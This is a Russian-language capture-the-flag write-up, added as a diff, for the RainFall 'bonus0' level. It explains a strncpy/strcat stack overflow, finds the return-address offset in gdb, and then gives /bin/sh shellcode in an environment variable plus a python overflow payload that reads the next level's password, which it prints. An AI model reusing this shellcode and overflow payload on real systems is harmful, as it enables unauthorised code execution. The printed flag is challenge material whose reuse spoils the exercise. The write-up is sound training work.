@@ -1,0 +1,94 @@
+# Bonus 0 - чтение за границами
+
+### 1. В функции read_to_arr из stdin читается 4096 байт (или пока не встретится перенос строки)
+
+```c++
+char *read_to_arr(char *dest, char *banner) {
+
+    ...
+    read(0, buf, 4096u);
+    *strchr(buf, '\n') = 0;
+    return strncpy(dest, buf, 20u);
+}
+```
+Если пользователь вводит строку, размер которой больше 20, то функция read_to_arr вернет строчку не закрытую \0.
+
+Из-за этого массивы, в которые читаются строчки из stdin'a, склеятся в одну строку следующим образом:
+
+```c++
+  char str1[20]; // [esp+28h] [ebp-30h]
+  char str2[28]; // [esp+3Ch] [ebp-1Ch]
+
+  str1 -> 0x0  | [aaaa...abbbbb...b]
+                          ↑ начало str2
+  str2 -> 0x20 | [bbbb... bb ... until \0]
+```
+```strcpy``` не сможет проверить, когда ```str1``` закончится и пойдет читать ```str2```. Функция ```strcat``` сделает тоже самое и вернет строку: ```str1 + str2 + whitespace + str2```.
+
+Такое поведение позволяет нам получить переполнение буфера, так как размер изначального массива, куда положится результат функции ```strcat```, всего 42 байта.
+
+### 2. Высчитываем оффсет до адреса возврата
+```dart
+└─# gdb -q ./bonus0
+
+gef➤  start
+[+] Breaking at '{<text variable, no debug info>} 0x80485a4 <main>'
+
+gef➤  pattern create
+[+] Generating a pattern of 1024 bytes (n=4)
+aaaaba....
+gef➤  c
+Continuing.
+ -
+aaaab...
+ -
+aaaab...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x65616161 in ?? ()
+gef➤  pattern search 0x65616161
+[+] Searching for '0x65616161'
+[+] Found at offset 13 (little-endian search) likely
+[+] Found at offset 16 (big-endian search)
+```
+На своей тачке я получаю оффсет **13**, а на вулнбоксе **9**.
+
+### 3. Записываем шеллкод, на который прыгнем в переменную окружения
+
+Стек можно исполнить, поэтому шеллкод в переменной окружения сработает:
+```dart
+bonus0@RainFall:~$ readelf -Wl bonus0 | grep GNU_STACK
+
+GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
+```
+
+Ссылка на переменные окружения лежит по адресу ```$(ebp) + 0x10```:
+
+``` dart
+bonus0@RainFall:~$ gdb -q ./bonus0
+
+➤ (gdb) start
+Temporary breakpoint 1, 0x080485a7 in main ()
+➤ (gdb) x/wx $ebp + 0x10
+0xbffff718:     0xbffff7ac
+➤ (gdb) x/wx 0xbffff7ac
+0xbffff7ac:     0xbffff8e6
+➤ (gdb) x/32s 0xbffff8e6
+0xbffff8e6:      "SHELL=/bin/bash"
+0xbffff8f6:      "TERM=xterm-256color"
+0xbffff90a:      "SSH_CLIENT=192.168.88.1 25591 4242"
+            ...
+0xbfffff12:      "shell=aaaa1\300Ph//shh/"
+```
+
+Адрес 0xbfffff12 +- 24 будет являться адресом шеллкода.
+
+``` sh
+bonus0@RainFall:~$ export shell=`echo -ne '\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n'` # \x90 (nop) подбираем до тех пор, пока адрес шеллкода не будет кратен 16-ти
+
+bonus0@RainFall:~$ (python -c "print 'a'*4095 + '\n' + 'B'*9 + '\x2a\xff\xff\xbf' + 'C'*7"; cat) | ./bonus0
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9 
+```
+
+
